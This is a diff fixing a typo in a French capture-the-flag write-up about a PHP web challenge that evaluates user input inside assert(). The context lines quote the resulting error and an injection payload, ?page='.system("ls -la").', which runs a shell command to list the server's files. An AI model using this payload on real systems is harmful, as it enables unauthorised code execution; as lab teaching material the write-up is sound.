@@ -24,7 +24,7 @@ donc on teste des valeurs ramdom pour voir ce que cela nous retourne
 ce qui va sans surprise nous retrouner une erreur:
 > Parse error: syntax error, unexpected T_STRING in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/'test'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8
 
-A partir de là on sait qu'on peut faire exé-cuter du code grâce à __?page=''__ donc le but dans un premier temps va être d'essayer de faire ressortir la liste des fichiers du répertoire. Pour ce faire on peut essayer d'utiliser la commande __system()__
+A partir de là on sait qu'on peut faire exécuter du code grâce à __?page=''__ donc le but dans un premier temps va être d'essayer de faire ressortir la liste des fichiers du répertoire. Pour ce faire on peut essayer d'utiliser la commande __system()__
 > ?page='.system("ls -la").'
 
 ce qui nous retourne la liste de tous les fichiers du répertoire courant
